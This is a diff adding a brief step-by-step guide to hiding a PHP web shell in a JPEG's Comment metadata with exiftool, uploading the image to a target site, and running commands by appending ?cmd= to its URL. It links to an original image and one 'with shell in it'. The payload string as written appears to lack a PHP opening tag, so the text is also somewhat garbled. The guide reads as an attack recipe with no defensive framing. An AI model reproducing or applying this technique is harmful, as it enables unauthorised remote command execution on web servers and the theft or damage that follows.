@@ -1,0 +1,16 @@
+To download the relevant tool:
+sudo apt-get install exiftool
+
+Go to the directory with the relevant photo:
+exiftool -Comment='"; system($_GET['cmd']); ?>' imagename.jpg
+
+Write the code and upload it to the target site
+After uploading, go to the link of the photo we uploaded and add ?cmd= to the end.
+
+original photo file:
+
+https://user-images.githubusercontent.com/62509862/135612520-c818e7fb-d889-4b14-b680-b675d05942fc.png
+
+photo file with shell in it:
+
+https://user-images.githubusercontent.com/62509862/135612230-4feb38f9-c235-4091-a80a-dba1008f07ab.png
